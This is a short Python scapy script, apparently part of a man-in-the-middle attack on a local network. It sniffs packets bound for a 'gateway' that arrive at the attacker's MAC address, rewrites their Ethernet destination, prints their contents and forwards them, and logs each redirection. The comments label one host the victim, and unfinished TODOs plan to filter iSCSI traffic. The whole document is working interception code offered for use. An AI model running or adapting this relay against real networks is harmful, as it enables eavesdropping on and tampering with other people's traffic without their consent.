#!/etc/usr/python

from scapy.all import *
import sys

iface = "eth0"
filter = "ip"
#victim in this case is the initiator
VICTIM_IP = "192.168.1.121"
MY_IP = "192.168.1.154"
# gateway is the target
GATEWAY_IP = "192.168.1.171"
#VICTIM_MAC = "### don't want so show###"
MY_MAC = "08:00:27:7b:80:18"
#target mac address
GATEWAY_MAC = "08:00:27:24:08:34"

def handle_packet(packet):
    if (packet[IP].dst == GATEWAY_IP) and (packet[Ether].dst == MY_MAC):
        # we change the packet destination to the target machine
        packet[Ether].dst = GATEWAY_MAC
        # TODO: block iscsi packets with an if condition
        if(packet[TCP]):
           # shows what the packet contains
           packet.show()
           # TODO: create condition to check/filter the 'dport' packet tcp argument for 'iscsi_target'
        sendp(packet)
        print "A packet from " + packet[IP].src + " redirected!"

sniff(prn=handle_packet, filter=filter, iface=iface, store=0)
